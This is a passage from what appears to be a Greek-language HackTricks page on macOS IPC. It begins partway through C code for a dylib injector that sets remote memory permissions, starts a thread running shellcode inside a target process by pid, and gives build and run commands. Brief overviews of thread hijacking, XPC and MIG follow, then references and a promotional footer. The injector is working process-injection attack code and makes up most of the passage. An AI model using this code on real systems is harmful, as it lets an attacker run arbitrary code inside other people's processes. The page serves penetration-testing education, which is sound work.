kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Δεν είναι δυνατή η ρύθμιση των δικαιωμάτων μνήμης για τον κώδικα του απομακρυσμένου νήματος: Σφάλμα %s\n", mach_error_string(kr));
return (-4);
}

// Ορίστε τα δικαιώματα στην εκχωρημένη μνήμη στο stack
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Δεν είναι δυνατή η ρύθμιση των δικαιωμάτων μνήμης για το stack του απομακρυσμένου νήματος: Σφάλμα %s\n", mach_error_string(kr));
return (-4);
}


// Δημιουργία νήματος για την εκτέλεση του shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // αυτό είναι το πραγματικό stack
//remoteStack64 -= 8;  // απαιτείται ευθυγράμμιση των 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Απομακρυσμένο Stack 64  0x%llx, Ο απομακρυσμένος κώδικας είναι %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Δεν είναι δυνατή η δημιουργία απομακρυσμένου νήματος: Σφάλμα %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Χρήση: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: διαδρομή προς ένα dylib στον δίσκο\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Το Dylib δεν βρέθηκε\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Απαγωγή Νήματος μέσω της Θύρας Εργασίας <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Σε αυτήν την τεχνική, απαγάγεται ένα νήμα της διεργασίας:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Βασικές Πληροφορίες

Το XPC, που σημαίνει XNU (το πυρήνας που χρησιμοποιείται από το macOS) Διαδικασία Επικοινωνίας, είναι ένα πλαίσιο για **επικοινωνία μεταξύ διεργασιών** στο macOS και το iOS. Το XPC παρέχει ένα μηχανισμό για την πραγματοποίηση **ασφαλών, ασύγχρονων κλήσεων μεθόδων μεταξύ διαφορετικών διεργασιών** στο σύστημα. Αποτελεί μέρος του παραδείγματος ασφαλείας της Apple, επιτρέποντας την **δημιουργία εφαρμογών με διαχωρισμένα προνόμια**, όπου κάθε **συνιστώσα** λειτουργεί με **μόνο τα δικαιώματα που χρειάζεται** για να εκτελέσει την εργασία της, περιορίζοντας έτσι την πιθανή ζημιά από μια παραβιασμένη διεργασία.

Για περισσότερες πληροφορίες σχετικά με τον τρόπο λειτουργίας αυτής της **επικοινωνίας** και πώς **μπορεί να είναι ευάλωτη**, ανατρέξτε στο:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - Παραγωγός Διεπαφής Mach

Ο MIG δημιουργήθηκε για να **απλοποιήσει τη διαδικασία δημιουργίας κώδικα Mach IPC**. Βασικά, **δημιουργεί τον απαιτούμενο κώδικα** για τον διακομιστή και τον πελάτη ώστε να επικοινωνούν με βάση μια συγκεκριμένη οριοθέτηση. Ακόμα κι αν ο δημιουργημένος κώδικας είναι άσχημος, ένας προγραμματιστής θα χρειαστεί απλά να τον εισάγει και ο κώδικάς του θα είναι πολύ απλούστερος από πριν.

Για περισσότερες πληροφορίες, ανατρέξτε στο:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Αναφορές

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε** 💬 στην ομάδα [**Discord**](https://discord.gg/hRep4RUj7f) ή στην ομάδα [**telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο GitHub.

</details>
